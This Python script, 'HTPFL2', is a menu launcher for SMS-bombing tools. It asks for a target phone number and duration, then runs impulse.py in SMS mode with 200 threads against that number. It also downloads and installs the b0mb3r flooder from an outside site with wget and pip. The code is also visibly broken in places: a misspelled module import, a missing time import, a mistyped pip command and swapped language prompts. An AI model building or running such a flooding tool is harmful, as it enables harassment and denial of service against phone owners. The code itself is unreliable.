import platform, os, sys, request, random
from time import strftime, sleep
from termcolor import colored

if platform.system() == "Windows":
	print("")
	print(colored("HTPFL Doesn't work on Windows", "red"))
	print("")
	sys.exit(0)

os.system("clear")

a = open("lan.txt", "r")
lan = a.read()
lan = str(lan)
a.close()

a = open("zn.txt", "r")
znak = a.read()
znak = str(znak)
a.close()

filee = "test.py"

# Проверка сети
def ICC():
    try:
        request.get("https://google.com", timeout=4)
    except:
        print(colored("[!]", "red"), colored("Ваше устройство не подключено к интернету", "magenta"))
        print(colored("[✓]", "green"), colored("С уважением HTPFL", "megenta"))
        print("")
        sys.exit(0)


print("")
print(colored("Checking your Internet connection...", "green"))
print("")
ICC()


#Баннер
def Banner():
    os.system("clear")
    colors = random.choice(["red", "blue", "magenta", "green", "cyan"])
    banner = '''
    ▄▄    ▄▄  ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄  ▄▄
    ██    ██  ▀▀▀██▀▀▀  ██▀▀▀▀█▄  ██▀▀▀▀▀▀  ██
    ██    ██     ██     ██    ██  ██        ██
    ████████     ██     ██████▀   ███████   ██
    ██    ██     ██     ██        ██        ██
    ██    ██     ██     ██        ██        ██▄▄▄▄▄▄
    ▀▀    ▀▀     ▀▀     ▀▀        ▀▀        ▀▀▀▀▀▀▀▀
    '''
    print(colored(banner, "red"))
    print("      ", colored("~[", "red")+colored("HTPFL²", "green"), colored("-", "blue"), colored("Hack The Panel From Lucky", "green")+colored("]~", "red"))
    print("               ", colored("~[", "red")+colored("CodeName", "magenta"),colored(":", "blue")+colored("Lucky", "green")+colored("]~", "red"))
    print("              ", colored("~[", "red")+colored("Version", "magenta"), colored(":", "blue")+ colored("2.0 Beta", "red")+colored("]~", "red"))
    print("          ", colored("~[", "red")+colored("Latest Update", "magenta"), colored(":")+colored("05.12.2020", "red")+colored("]~", "red"))
    print("")
    if lan == "ru":
        print(colored("[1]", "red"), colored("Sms Bomber", "magenta"))
        print("")
        print("")
        print(colored("[99]", "red"), colored("О Программе", "cyan"))
        print("")
        print(colored("[Act]", "red"), colored("Действия Панели", "green"))
        print(colored("[Lan]", "red"), colored("Настройки Языка", "magenta"))
        print(colored("[Sn]", "red"), colored("Настройки Значка Ввода", "yellow"))
        print(colored("[0] Выход", "red"))
        print("")
    else:
        print("")
        print(colored("[99]", "red"), colored("About Programm", "cyan"))
        print("")
        print(colored("[Act]", "red"), colored("Actions Pane", "green"))
        print(colored("[Lan]", "red"), colored("Language Setting", "magenta"))
        print(colored("[Sn]", "red"), colored("Input Icon Settings", "yellow"))
        print(colored("[0] Exit", "red"))
        print("")
Banner()

def osnova():
	while True:
		About()

def bomber():
    print("")
    #Проверка модулей Impulse
    ok = "d"
    try:
        import requests
        import scapy
        import wget
        import argparse
        import colorama
        import humanfriendly
        ok = colored("✔️", "green")
    except:
        ok = colored("❌", "red")
    print(colored("[1]", "red"),colored("Impulse", "magenta"))
    if lan == "ru":
        print(colored("[2]", "red"),colored("Установка модулей для Impulse", "magenta")+ok)
    else:
        print(colored("[2]", "red"),colored("Installing modules for Imoulse", "magenta")+ok)
    print("")
    print(colored("[3]", "red"), colored("b0mb3r", "red"))
    a = open("bomb.txt", "r")
    ok2 = a.read()
    ok2 = str(ok2)
    if ok2 == "✔️":
        ok2 == colored("✔️", "green")
    else:
        ok2 = colored("❌", "red")
    if lan == "ru":
        print(colored("[4]", "red"), colored("Установка b0mb3r", "red")+ok2)
        print("")
        print("")
        print(colored("[0] Назад", "red"))
    else:
        print(colored("[4]", "red"), colored("Installing b0mb3r", "red") + ok2)
        print("")
        print("")
        print(colored("[0] Back", "red"))
    print("")
    varr = input(colored(" " + znak + " ", "red"))
    if varr == "1":
        if ok == colored("❌", "red"):
            if lan == "ru":
                print(colored("Вы не установили модули для Impulse", "red"))
                sleep(1.2)
                while True:
                    bomber()
            else:
                print(colored("You have not installed modules for Impulse", "red"))
                sleep(1.2)
                while True:
                    bomber()
        else:
            if lan == "ru":
                number = input(colored("Number ", "red") + "+")
                timer = input(colored("Time in Seconds ", "blue"))
                print(colored("Stop spam Ctrl + C", "green"))
                sleep(4)
                try:
                    os.system("python impulse.py --target " + str(number) + " --method SMS --time " + str(timer) + " --threads 200")
                    while True:
                        Banner()
                        osnova()
                except KeyboardInterrupt:
                    while True:
                        Banner()
                        osnova()
            else:
                number = input(colored("Номер ", "red") + "+")
                timer = input(colored("Время в секундах ", "blue"))
                print(colored("Остановить спам Ctrl + C", "green"))
                time.sleep(4)
                try:
                    os.system("python impulse.py --target " + str(number) + " --method SMS --time " + str(
                        timer) + " --threads 200")
                except KeyboardInterrupt:
                    while True:
                        Banner()
                        osnova()
    elif varr == "2":
        modules = ["requests", "wget", "scapy", "argparse", "colorama", "humanfriendly"]
        if lan == "ru":
            print(colored("Старт...", "green"))
            os.system("pip install --upgrade pip")
            for mod in modules:
                os.system("pip install "+mod)
            while True:
                bomber()
        else:
            if lan == "ru":
                print(colored("Start...", "green"))
                os.system("pip insatall --upgrade pip")
                for mod in modules:
                    os.system("pip install " + mod)
                while True:
                    bomber()
    elif varr == "3":
        a = open("bomb.txt", "r")
        hmm = a.read()
        hmm = str(hmm)
        a.close()
        if hmm == "yes":
            if lan == "ru":
                print(colored("Старт...", "green"))
            else:
                print(colored("Start...", "green"))
            print("")
            try:
                sleep(2)
                if lan == "ru":
                    print(colored("Чтобы остановить b0mb3r используйте Ctrl + C", "yellow"))
                else:
                    print(colored("To stop b0mb3r use Ctrl + C", "yellow"))
                os.system("b0mb3r")
            except KeyboardInterrupt:
                while True:
                    Banner()
                    osnova()
        else:
            if lan == "ru":
                print(colored("Вы не установили b0mb3r", "red"))
                sleep(1.2)
                while True:
                    bomber()
            else:
                print(colored("You have not installed b0mb3r", "red"))
                sleep(1.2)
                while True:
                    bomber()
    elif varr == "4":
        if lan == "ru":
            print(colored("Старт...", "green"))
        else:
            print(colored("Start...", "green"))
        print("")
        os.system("pkg install wget python unzip")
        os.system("wget https://FSystem88.ru/spymer/b0mb3r.zip")
        os.system("unzip b0mb3r.zip")
        os.system("pip3 install ./b0mb3r-master")
        print("")
        a = open("bomb.txt", "w")
        a.write("✔️")
        a.close()
        while True:
            bomber()
    else:
        while True:
            Banner()
            osnova()

def act():
    print("")
    if lan == "ru":
        print(colored("[1]", "red"), colored("Обновить", "green"))
        print(colored("\n[2]", "red"), colored("Удалить", "green"))
        print("")
        print("")
        print(colored("[0] Назад", "red"))
        print("")
        var = input(colored(" " + znak + " ", "red"))
        if var == "1":
            print(colored("\nСтарт...\n", "green"))
            os.system("cd && rm -rf HTPFL2 && git clone https://github.com/Lucky1376/HTPFL2 && cd HTPFL2 && python HTPFL2.py")
            sys.exit(0)
        elif var == "2":
            print("\nСтарт удаления...", "red")
            os.system("cd && rm -rf HTPFL2")
            os.system("clear")
            sys.exit(0)
        else:
            while True:
                Banner()
                osnova()
    else:
        print(colored("[1]", "red"), colored("Update", "green"))
        print(colored("\n[2]", "red"), colored("Remove", "green"))
        print("")
        print("")
        print(colored("[0] Back", "red"))
        print("")
        var = input(colored(" " + znak + " ", "red"))
        if var == "1":
            print(colored("\nStart...\n", "green"))
            os.system(
                "cd && rm -rf HTPFL2 && git clone https://github.com/Lucky1376/HTPFL2 && cd HTPFL2 && python HTPFL2.py")
            sys.exit(0)
        elif var == "2":
            print("\nStart remove...", "red")
            os.system("cd && rm -rf HTPFL2")
            os.system("clear")
            sys.exit(0)
        else:
            while True:
                Banner()
                osnova()

def prog():
    print("")
    print(colored("Telegram -", "magenta"), colored("@Lucky1376", "green"))
    print("")
    print(colored("VK -", "blue"), colored("https://m.vk.com/id554311036", "red"))
    print("")
    print("")
    if lan == "ru":
        print(colored("[0] Назад", "red"))
    else:
        print(colored("[0] Назад", "red"))
    print("")
    varik = input(colored(" " + znak + " ", "red"))
    while True:
        Banner()
        osnova()


def sn():
    print("")
    if lan == "ru":
        print(colored("Ведите значёк который хотите видеть при вводе\nВаш значёк на данный момент -", "blue"), colored(znak, "red"))
        print(colored("Длина значка от 1-6 символов", "green"))
        print(colored("\n[0] Назад", "red"))
        print("")
        znn = input(colored("Ваш значёк: ", "red"))
        if len(znn) <= 0:
            print(colored("Значёк должен состоять хотябы из 1 символа", "red"))
            sys.exit(0)
        elif len(znn) >= 7:
            print(colored("Значёк не должен быть больше 6 символов", "red"))
            sys.exit(0)
        elif znn == "0":
            while True:
                Banner()
                osnova()
        else:
            a = open("zn.txt", "w")
            a.write(znn)
            a.close()
            os.system("python " + filee)
            sleep(0.1)
            sys.exit(0)
    else:
        print(colored("Enter the icon you want to see when you enter\nYour current icon -", "blue"),colored(znak, "red"))
        print(colored("The length of the icon from 1-6 characters", "green"))
        print(colored("\n[0] Back", "red"))
        print("")
        znn = input(colored("Your icon: ", "red"))
        if len(znn) <= 0:
            print(colored("The icon must consist of at least 1 character", "red"))
            sys.exit(0)
        elif len(znn) >= 7:
            print(colored("The icon must not exceed 6 characters", "red"))
            sys.exit(0)
        elif znn == "0":
            while True:
                Banner()
                osnova()
        else:
            a = open("zn.txt", "w")
            a.write(znn)
            a.close()
            os.system("python " + filee)
            sleep(0.1)
            sys.exit(0)


def set():
    print("")
    if lan == "ru":
        print(colored("[1]", "red"),colored("Русский", "red"))
        print(colored("[2]", "red"),colored("Англиский", "blue"))
        print(colored("\n[0]", "red"),colored("Назад", "red"))
        print("")
        lang = input(colored(" "+znak+" ", "red"))
        if lang == "1":
            a = open("lan.txt", "w")
            a.write("ru")
            a.close()
            os.system("python " + filee)
            sleep(0.1)
            sys.exit(0)
        elif lang == "2":
            a = open("lan.txt", "w")
            a.write("usa")
            a.close()
            os.system("python " + filee)
            sleep(0.1)
            sys.exit(0)
        else:
            while True:
                Banner()
                osnova()
    else:
        print(colored("[1]", "red"),colored("Russian", "red"))
        print(colored("[2]", "red"),colored("USA", "blue"))
        print(colored("\n[0]", "red"),colored("Back", "red"))
        print("")
        lang = input(colored(" " + znak + " ", "red"))
        if lang == "1":
            a = open("lan.txt", "w")
            a.write("ru")
            a.close()
            os.system("python "+filee)
            sleep(0.1)
            sys.exit(0)
        elif lang == "2":
            a = open("lan.txt", "w")
            a.write("usa")
            a.close()
            os.system("python " + filee)
            sleep(0.1)
            sys.exit(0)
        else:
            while True:
                Banner()
                osnova()



def About():
    global numb
    numb = input(colored(" "+znak+" ", "red"))
    if numb == "0":
        if lan == "ru":
            os.system("clear")
            print(colored("\nУдачи!\n", "green"))
            sys.exit(0)
        else:
            os.system("clear")
            print(colored("\nGood luck!\n", "green"))
            sys.exit(0)
    elif numb == "Lan" or numb == "lan":
        while True:
            set()
    elif numb == "Sn" or numb == "sn":
        while True:
            sn()
    elif numb == "99":
        while True:
            prog()
    elif numb == "1":
        while True:
            bomber()
    elif numb == "act" or numb == "Act":
        while True:
            act()
    else:
        if lan == "ru":
            os.system("clear")
            print(colored("\nОшибка!\n", "red"))
            sys.exit(0)
        else:
            os.system("clear")
            print(colored("\nERROR!\n", "red"))
            sys.exit(0)

About()
